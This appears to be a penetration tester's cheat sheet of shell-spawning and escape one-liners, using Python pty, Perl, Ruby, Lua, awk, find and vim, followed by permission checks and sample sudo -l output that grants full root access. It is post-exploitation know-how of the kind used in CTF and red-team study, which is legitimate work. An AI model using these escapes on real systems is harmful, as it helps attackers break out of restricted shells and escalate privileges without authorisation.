# Bash vs Sh
- make sure to change binary used (/bin/sh OR /bin/bash) to whatever the system is using
# Python
```Markdown
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
  
# /bin/sh -i
```Markdown
/bin/sh -i
```
  
# Perl
```Markdown
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
```
  
# Ruby
```Markdown
ruby: exec "/bin/sh"
```
  
# Lua
```Markdown
lua: os.execute('/bin/sh')
```
  
# Awk
```Markdown
awk 'BEGIN {system("/bin/sh")}'
```
  
# Find
```Markdown
find / -name <filename> -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```
  
# Exec
```Markdown
find . -exec /bin/sh \; -quit
```
  
# VIM
```Markdown
vim -c ':!/bin/sh'
```
  
# VIM Escape
```Markdown
vim
:set shell=/bin/sh
:shell
```
  
# Execution Permissions Considerations
## Permissions
```Markdown
ls -la <path/to/fileorbinary>
```
  
## Sudo -l
```Markdown
sudo -l
Matching Defaults entries for apache on ILF-WebSrv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```